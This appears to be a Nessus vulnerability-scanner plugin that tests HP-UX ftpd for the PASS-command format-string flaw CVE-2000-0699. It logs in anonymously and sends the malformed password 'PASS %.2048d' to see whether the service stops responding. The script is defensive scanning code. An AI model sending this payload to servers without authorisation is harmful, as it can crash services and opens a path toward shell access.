#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
#
# See the Nessus Scripts License for details
#


if(description)
{
 script_id(10490);
 script_bugtraq_id(1560);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-2000-0699");

 
 name["english"] = "hpux ftpd PASS vulnerability";
 name["francais"] = "Vulnérabilité PASS de ftpd de hpux";
 
 script_name(english:name["english"],
             francais:name["francais"]);
             
 desc["english"] = "
The remote ftp server does not sanitize properly the argument of
the PASS command it receives for anonymous accesses.

It may be possible for a remote attacker
to gain shell access.

Solution : Upgrade your ftpd server or disable anonymous
access
Risk factor : High";
                 
                 
desc["francais"] = "
Le serveur ftp ne vérifie pas correctement les arguments de la
commande PASS pour les accès anonymes.

Il est possible d'obtenir un accès 
shell en exploitant ce bug.

Solution : mettez à jour votre serveur ftpd ou désactivez
l'accès anonyme
Facteur de risque : Elevé";
                     
 script_description(english:desc["english"],
                    francais:desc["francais"]);
                    
 
 script_summary(english:"Checks if the remote ftp sanitizes the PASS command",
                francais:"Détermine si le serveur ftp distant vérifie la commande PASS");
 script_category(ACT_ATTACK);
 script_family(english:"FTP", francais:"FTP");

 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
                  francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
                  
 script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_kibuv_worm.nasl");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here : 
#

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);

if (get_kb_item('ftp/'+port+'/backdoor')) exit(0);

banner = get_ftp_banner(port:port);
if ( ! banner || " FTP server" >!< banner ) exit(0);

# Connect to the FTP server
soc = open_sock_tcp(port);
ftpport = port;
if(soc)
{
 r = ftp_recv_line(socket:soc);
 if(!strlen(r))exit(0);

 
 req = string("USER ftp\r\n");
 send(socket:soc, data:req);
 
 r = ftp_recv_line(socket:soc);
 if(!strlen(r))exit(0);
 

 req = string("PASS %.2048d\r\n");
 send(socket:soc, data:req);
 r = ftp_recv_line(socket:soc);
 
 
 if(egrep(string:r, pattern:"^230 .*"))
 {
  req = string("HELP\r\n");
  send(socket:soc, data:req);
  r = ftp_recv_line(socket:soc);
  if(!r)security_hole(port);
 }
 close(soc);
}
